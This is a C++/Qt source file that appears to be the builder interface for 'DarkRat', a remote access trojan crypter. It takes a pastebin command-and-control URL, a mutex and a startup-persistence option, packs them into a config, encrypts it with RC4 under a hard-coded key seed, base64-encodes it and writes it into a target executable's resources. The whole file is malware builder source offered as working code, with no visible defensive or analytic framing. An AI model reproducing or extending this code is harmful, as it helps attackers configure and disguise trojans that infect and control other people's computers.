#include "DarkRatCrypterUI.h"
#include <filesystem>
#include "rc4.h"
#include <QtWidgets\QMessageBox>
#include "RawBuilder.h"
#include "base64.h"
#include "json.h"
std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

std::string key(size_t length, size_t seed)
{
	srand(seed);
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

DarkRatCrypterUI::DarkRatCrypterUI(QWidget *parent)
	: QMainWindow(parent)
{
	ui.setupUi(this);

	ui.mutex->setText(QString::fromStdString(random_string(5)));
	ui.encryptionkey->setText(QString::fromStdString(random_string(32)));
//	ui.output->setText("Output.exe");
}
char output[MAX_PATH];


void DarkRatCrypterUI::on_selectPayload_clicked()
{
	QString filename = QFileDialog::getOpenFileName(this, "Open a File", QDir::currentPath(), "Executable Files (*.exe)");
//	ui.inputFileLable->setText("File: " + filename);
}



void DarkRatCrypterUI::on_gen_mutex_clicked()
{
	ui.mutex->setText(QString::fromStdString(random_string(5)));
}

void DarkRatCrypterUI::on_gen_enckey_clicked()
{
	ui.encryptionkey->setText(QString::fromStdString(random_string(32)));
}


void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

QString base64_encode(QString string) {
	QByteArray ba;
	ba.append(string);
	return ba.toBase64();
}
void DarkRatCrypterUI::on_build_clicked()
{
	RC4 rc4;
	std::string startup;
	if (ui.startup->isChecked()) {
		startup = "true";
	}
	else {
		startup = "false";
	}

	std::string foot = "\"";
	std::string pastebinURl = ui.pastebinurl->text().toStdString();
	std::string mutex = ui.mutex->text().toStdString();
	//std::string encryptionKey = ui.encryptionkey->text().toStdString();
	std::string encryptionKey = "KQC";



	nlohmann::json config = {
		{ "ek", "KQC"},
		{ "pu", pastebinURl},
		{ "mux", mutex},
		{ "sup", startup},
		{ "ri", 5},
		{ "pn", {"FOO", "BAR"}}
	};
	std::string write = config.dump();
	std::cout << write << std::endl;
	write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
    write = config.dump();


	write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
	write = darkRat::crypto::b64::encode(write.c_str());
	char* c_write = &write[0u];


	WriteToResources("test.exe", 10, (BYTE*)c_write, strlen(c_write));
	//MessageBox(NULL, TEXT("Open the message box1 "), , MB_OK | MB_SYSTEMMODAL);



	/*
	std::string json = " { \"ek\":  "+foot + encryptionKey + foot+"  , \"pu\":  "+ foot  + pastebinURl+ foot+"    , \"mux\": "+ foot+ mutex+ foot+" , \"sup\": "+foot + startup + foot+" , \"ri\": 5 , \"pn\": [\"FOO\",\"BAR\"]} ";

	QMessageBox msgBox1;
	msgBox1.setText(QString::fromStdString(json));
	msgBox1.exec();

	//json = rc4.doRC4(json, ui.encryptionkey->text().toStdString());
	json = rc4.doRC4(json, key(32, 0x4d930cf57cfda1ba));
	QString b64string = base64_encode(QString::fromStdString(json));
	std::string write = b64string.toStdString();


	
	char* c_write = &write[0u];
	QMessageBox msgBox;
	msgBox.setText(QString::fromStdString(write));
	msgBox.exec();
	WriteToResources("test.exe", 10, (BYTE*)c_write, strlen(c_write));
	//int status = RunPortableExecutable(rawData, buildString);

	*/
	//ui.statusBar->showMessage(QString::fromStdString() , 1000);
	
}
